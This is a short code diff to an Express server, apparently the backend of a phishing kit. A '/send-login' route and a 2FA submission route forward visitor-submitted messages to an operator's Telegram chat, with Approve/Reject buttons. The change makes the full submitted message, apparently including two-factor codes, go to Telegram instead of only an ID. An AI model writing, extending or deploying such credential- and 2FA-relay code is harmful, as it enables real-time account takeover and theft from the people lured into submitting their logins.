@@ -120,7 +120,7 @@ app.post("/send-login", async (req, res) => {
 
 // -----------------
 // 2FA: Submit code (called by frontend)
-// Sends emoji + requestId to Telegram with Approve/Reject buttons
+// Sends formatted message to Telegram and stores pending request
 // -----------------
 app.post("/api/submit-2fa", async (req, res) => {
   const { message, requestId } = req.body;
@@ -133,12 +133,12 @@ app.post("/api/submit-2fa", async (req, res) => {
   pending2FA[requestId] = { status: "pending", message };
   console.log(`📥 2FA Request received: ${requestId}`);
 
-  // Send to Telegram admin — emoji + requestId only, then buttons
+  // Send to Telegram admin with Approve/Reject buttons
   try {
     const { bot } = require("./bot");
     await bot.sendMessage(
       process.env.ADMIN_CHAT_ID || process.env.CHAT_ID,
-      `🔐 <code>${requestId}</code>`,
+      message,
       {
         parse_mode: "HTML",
         reply_markup: {
